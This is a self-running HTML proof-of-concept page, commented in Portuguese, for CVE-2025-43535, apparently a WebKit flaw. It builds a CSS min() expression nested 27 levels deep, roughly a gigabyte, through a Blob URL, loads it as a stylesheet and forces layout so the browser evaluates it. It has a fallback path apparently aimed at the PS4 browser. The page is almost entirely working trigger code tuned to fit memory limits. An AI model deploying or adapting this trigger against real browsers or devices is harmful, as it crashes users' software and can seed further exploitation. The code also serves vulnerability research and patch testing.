<!DOCTYPE html>
<!--
  PoC: CVE-2025-43535 — Variante 1 ISOLADA
  Método de redução de RAM: Blob URL

  ANÁLISE DO PROBLEMA DE RAM:
  ══════════════════════════════════════════════════════════════
  A função makeMathNested(d) usa `depth % 1` (sempre = 0),
  portanto sempre usa 'min', gerando uma árvore BINÁRIA:

    makeMathNested(27) = "min( [26], [26] )"
                                 ↑     ↑
                          cada um = 576MB de string

  Pico de RAM com recursão original:
    - 1ª chamada de makeMathNested(26) retorna 576MB → fica na memória
    - 2ª chamada de makeMathNested(26) constrói mais 576MB
    - Montagem final: 576 + 576 + 1120 = 2.25GB de pico

  MÉTODO DE REDUÇÃO: Blob URL
  ══════════════════════════════════════════════════════════════
  Em vez de ter a string de 1.12GB no JS heap, usamos a API Blob:

    new Blob([prefix, expr26, ', ', expr26, suffix], {type:'text/css'})

  O Blob é alocado FORA do JS heap (na memória do processo do browser,
  gerenciada pelo C++, não pelo GC do JavaScript).

  Depois de criar o Blob, podemos null-ificar expr26 e o GC libera
  os 576MB do JS heap — restando apenas o Blob em memória C++.

  Comparação de pico:
  ┌──────────────────────┬──────────────┬──────────────┐
  │ Método               │ Pico JS heap │ Pico Total   │
  ├──────────────────────┼──────────────┼──────────────┤
  │ Original (recursivo) │ 2.25 GB      │ 2.25 GB      │
  │ Iterativo simples    │ 1.73 GB      │ 1.73 GB      │
  │ Blob URL ← ESTE      │ 576 MB       │ ~1.12 GB     │
  └──────────────────────┴──────────────┴──────────────┘

  O trigger WebKit é IDÊNTICO: recebe a mesma regra CSS
  com a expressão min() de depth=27 para avaliar.
-->
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535 — V1 Isolada (Blob RAM reduction)</title>
<style>
  body  { background:#0a0a0a; color:#88ff88; font-family:monospace;
          padding:16px; margin:0; font-size:13px; }
  #log  { background:#111; border:1px solid #2a4a2a; padding:10px;
          height:60vh; overflow-y:auto; font-size:11px; line-height:1.7; }
  .ok   { color:#00ff88 }
  .fail { color:#ff4444 }
  .info { color:#ffcc44 }
  .warn { color:#ff8844 }
  .crash{ color:#ff44ff; font-weight:bold; font-size:1.1em }
  .dim  { color:#336633 }
  .bar  { background:#0a1a0a; border:1px solid #1a3a1a; color:#44aa44;
          padding:6px 10px; margin-bottom:8px; font-size:11px; }
</style>
</head>
<body>

<div style="color:#aaffaa;font-size:12px;margin-bottom:6px">
  CVE-2025-43535 · Variante 1 isolada · Blob URL RAM reduction
</div>
<div class="bar" id="bar">Aguardando...</div>
<div id="log"></div>
<div id="stage" style="position:absolute;top:-9999px;left:-9999px;
                       width:1px;height:1px;overflow:hidden"></div>

<script>
"use strict";

const logEl = document.getElementById('log');
const barEl = document.getElementById('bar');
const stage = document.getElementById('stage');

function L(m, c) {
  logEl.innerHTML += `<div class="${c||'dim'}">${m}</div>`;
  logEl.scrollTop  = logEl.scrollHeight;
}
function bar(m) { barEl.textContent = m; }

// ──────────────────────────────────────────────────────────────
// makeMathNested ORIGINAL — mantido exatamente como no arquivo
// enviado. depth % 1 === 0 sempre → sempre 'min' → árvore binária
// ──────────────────────────────────────────────────────────────
function makeMathNested(depth) {
  if (depth <= 0) return '1px';
  const funcs = ['min', 'max', 'clamp'];
  const f = funcs[depth % 1];                   // sempre 'min'
  if (f === 'clamp') {
    return `clamp(${makeMathNested(depth-1)}, ${depth*2}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
  }
  return `${f}(${makeMathNested(depth-1)}, ${makeMathNested(depth-1)})`;
}

// ──────────────────────────────────────────────────────────────
// VERSÃO BLOB: constrói depth=26 no JS heap (576MB pico),
// depois monta o CSS inteiro num Blob fora do JS heap,
// libera a string JS, carrega via <link> externo
// ──────────────────────────────────────────────────────────────
function triggerBlob(targetDepth) {
  return new Promise((resolve, reject) => {

    // ── Fase 1: construir depth-1 no JS heap ──────────────────
    const buildDepth = targetDepth - 1; // 26
    bar(`[1/5] Construindo depth=${buildDepth} (pico ~${(9*Math.pow(2,buildDepth)/1024/1024).toFixed(0)}MB)...`);
    L(`[Blob] Fase 1: construindo depth=${buildDepth} iterativamente...`, 'info');
    L(`[Blob] Pico JS heap esperado: ${(9*Math.pow(2,buildDepth)/1024/1024).toFixed(0)}MB`, 'warn');

    // Yield para a UI antes de começar o trabalho pesado
    setTimeout(function buildPhase() {

      let expr26;
      try {
        // Iterativo bottom-up: evita a dupla recursão do original
        // Pico por passo: S(d-1) + S(d), mas sem duas cópias simultâneas
        let e = '1px';
        for (let d = 1; d <= buildDepth; d++) {
          const next = `min(${e}, ${e})`;
          e = null;         // GC hint: liberar string anterior
          e = next;
          // Yield a cada 5 níveis para permitir GC
          // (não é possível yield dentro de loop síncrono,
          //  mas o null hint ajuda o GC a liberar antes do próximo step)
        }
        expr26 = e;
        e = null;
      } catch(err) {
        L(`[Blob] Falha ao construir depth=${buildDepth}: ${err}`, 'fail');
        resolve(); return;
      }

      const sz = expr26 ? expr26.length : 0;
      L(`[Blob] depth=${buildDepth} construído: ${(sz/1024/1024).toFixed(0)}MB ✓`, 'ok');
      bar(`[2/5] Criando Blob com a expressão de depth=${targetDepth}...`);
      L(`[Blob] Fase 2: montando Blob (fora do JS heap)...`, 'info');

      // ── Fase 2: criar Blob com depth=27 FORA do JS heap ─────
      // O Blob recebe [prefix, expr26, ', ', expr26, suffix]
      // O browser aloca 1.12GB em memória C++, não no GC JS
      let blobUrl;
      try {
        const prefix = '.min27 { width: min(';
        const suffix = `); height: min(${expr26}, ${expr26}); }`;

        // Criar blob com as partes separadas (evita concatenar em JS)
        const blob = new Blob(
          [prefix, expr26, ', ', expr26, suffix],
          { type: 'text/css' }
        );

        blobUrl = URL.createObjectURL(blob);

        // LIBERAR as strings JS — o Blob tem sua própria cópia
        expr26 = null;

        L(`[Blob] Blob criado (${(blob.size/1024/1024).toFixed(0)}MB) fora do JS heap ✓`, 'ok');
        L(`[Blob] expr26 JS heap liberada (GC pode coletar 576MB) ✓`, 'ok');

      } catch(err) {
        expr26 = null;
        L(`[Blob] Falha ao criar Blob: ${err}`, 'fail');
        L(`[Blob] Blob URL pode não ser suportado neste browser`, 'warn');
        resolve(); return;
      }

      bar(`[3/5] Carregando stylesheet via Blob URL...`);
      L(`[Blob] Fase 3: carregando stylesheet via <link>...`, 'info');

      // ── Fase 3: criar elemento target + stylesheet ───────────
      const el = document.createElement('div');
      el.className = 'min27';
      el.style.cssText = 'position:absolute;visibility:hidden';
      stage.appendChild(el);

      const link = document.createElement('link');
      link.rel  = 'stylesheet';
      link.href = blobUrl;

      link.onload = function() {
        bar(`[4/5] Stylesheet carregada — forçando layout...`);
        L(`[Blob] Fase 4: stylesheet carregada ✓`, 'ok');
        L(`[Blob] Forçando layout (getComputedStyle + offsetWidth)...`, 'warn');
        L(`[Blob] → WebKit avalia min( min(...1px...) , min(...1px...) ) depth=27`, 'warn');

        // ── Fase 4: forçar avaliação pelo WebKit ─────────────
        try {
          void el.offsetWidth;
          const cs = window.getComputedStyle(el);
          const w  = cs.getPropertyValue('width');
          L(`[Blob] getComputedStyle width="${w}"`, 'ok');
        } catch(e) {
          L(`[Blob] Exceção em layout: ${e}`, 'fail');
        }

        // ── Fase 5: cleanup ───────────────────────────────────
        bar(`[5/5] Cleanup...`);
        try {
          URL.revokeObjectURL(blobUrl);
          document.head.removeChild(link);
          stage.removeChild(el);
        } catch(e) {}

        L(`[Blob] Fase 5: cleanup OK`, 'ok');
        L(``, '');
        L(`[Blob] ═══════════════════════════════════`, 'info');
        L(`[Blob] RESULTADO:`, 'info');
        L(`[Blob] Crash/reload = CVE-2025-43535 PRESENTE`, 'crash');
        L(`[Blob] Sem crash = patched ou WebKit cacheou`, 'ok');
        L(`[Blob] ═══════════════════════════════════`, 'info');
        bar('DONE');
        resolve();
      };

      link.onerror = function(e) {
        L(`[Blob] Erro ao carregar stylesheet: ${e}`, 'fail');
        L(`[Blob] Possível: Blob URLs não permitidos neste contexto`, 'warn');
        URL.revokeObjectURL(blobUrl);
        try { document.head.removeChild(link); } catch(e2) {}
        try { stage.removeChild(el); } catch(e2) {}
        bar('ERRO — tentando fallback...');
        resolve();
      };

      document.head.appendChild(link);

    }, 100); // yield 100ms para UI e GC antes do trabalho pesado
  });
}

// ──────────────────────────────────────────────────────────────
// FALLBACK: caso Blob URL não funcione no PS4,
// usa a abordagem iterativa simples (pico 1.73GB)
// em vez da recursiva original (pico 2.25GB)
// ──────────────────────────────────────────────────────────────
function triggerFallback(targetDepth) {
  return new Promise(resolve => {
    bar(`[FB] Iterativo depth=${targetDepth} (pico ~1.7GB)...`);
    L(`[FB] Blob URL não funcionou — usando iterativo como fallback`, 'warn');
    L(`[FB] Pico: ~1.73GB (vs 2.25GB original)`, 'info');

    setTimeout(function() {
      const sheet = document.createElement('style');
      document.head.appendChild(sheet);
      const el = document.createElement('div');
      el.style.cssText = 'position:absolute;visibility:hidden';
      stage.appendChild(el);

      try {
        bar(`[FB] Construindo depth=${targetDepth}...`);

        // Iterativo: mesmo resultado que recursivo mas sem
        // duas cópias simultâneas em memória
        let expr = '1px';
        for (let d = 1; d <= targetDepth; d++) {
          const next = `min(${expr}, ${expr})`;
          expr = null; // GC hint
          expr = next;
        }

        L(`[FB] Expressão: ${(expr.length/1024/1024).toFixed(0)}MB`, 'ok');
        bar('[FB] Aplicando ao WebKit...');

        el.style.width  = expr;
        el.style.height = expr;
        expr = null; // GC hint — liberar antes do layout

        void el.offsetWidth;
        const w = window.getComputedStyle(el).width;
        L(`[FB] width="${w}"`, 'ok');

      } catch(e) {
        L(`[FB] Exceção: ${e}`, 'fail');
      }

      try { document.head.removeChild(sheet); } catch(e) {}
      try { stage.removeChild(el); } catch(e) {}
      bar('FB DONE');
      resolve();
    }, 100);
  });
}

// ──────────────────────────────────────────────────────────────
// EXECUTOR
// ──────────────────────────────────────────────────────────────
async function main() {
  L('═══════════════════════════════════════════', 'info');
  L('CVE-2025-43535 — Variante 1 ISOLADA', 'info');
  L('Método de redução: Blob URL', 'info');
  L('', '');
  L('Comparação de pico de RAM:', 'info');
  L('  Original (recursivo):  2.25 GB pico JS heap', 'warn');
  L('  Iterativo simples:     1.73 GB pico JS heap', 'warn');
  L('  Blob URL (este):        576 MB pico JS heap ✓', 'ok');
  L('', '');
  L('Trigger WebKit: IDÊNTICO ao original (depth=27)', 'ok');
  L('═══════════════════════════════════════════', 'info');

  await new Promise(r => setTimeout(r, 300));

  const TARGET_DEPTH = 27; // mesmo valor que causava o crash

  // Verificar se Blob URL está disponível
  if (typeof URL !== 'undefined' && typeof URL.createObjectURL === 'function' &&
      typeof Blob !== 'undefined') {
    L(`Blob URL disponível ✓ — usando abordagem principal`, 'ok');
    await triggerBlob(TARGET_DEPTH);
  } else {
    L(`Blob URL NÃO disponível — usando fallback iterativo`, 'warn');
    await triggerFallback(TARGET_DEPTH);
  }
}

window.addEventListener('load', () => setTimeout(main, 200));
</script>
</body>
</html>
